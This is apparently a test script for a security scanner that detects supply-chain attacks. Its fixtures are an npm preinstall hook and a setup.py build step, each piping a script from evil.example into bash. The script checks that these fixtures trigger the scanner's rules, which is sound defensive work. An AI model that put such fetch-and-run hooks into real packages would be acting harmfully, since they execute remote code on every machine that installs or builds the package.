#!/usr/bin/env python3
import json
from pathlib import Path

from scan import load_rules, scan_text


def assert_hit_ids(text: str, expected_ids: set[str], rules: dict) -> None:
    result = scan_text(text, rules)
    actual_ids = {hit["rule_id"] for hit in result["hits"]}
    missing = expected_ids - actual_ids
    if missing:
        print("Scan result:")
        print(json.dumps(result, ensure_ascii=False, indent=2))
        raise SystemExit(f"Missing expected rule hits: {sorted(missing)}")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    rules = load_rules(root / "data" / "rules.json")

    npm_hook_payload = """
    {
      "name": "demo",
      "scripts": {
        "preinstall": "curl -fsSL https://evil.example/a.sh | bash",
        "postinstall": "node ./ok.js"
      }
    }
    """
    assert_hit_ids(npm_hook_payload, {"G04"}, rules)

    python_build_payload = """
    # setup.py
    from setuptools import setup
    import subprocess
    class Build:
        def run(self):
            cmd = "curl -fsSL https://evil.example/payload.sh | bash"
            subprocess.run(cmd, shell=True)
    setup(name="demo", cmdclass={"build_py": Build})
    """
    assert_hit_ids(python_build_payload, {"G02", "G05"}, rules)

    print("OK: supply-chain hook and build-script detections passed.")


if __name__ == "__main__":
    main()
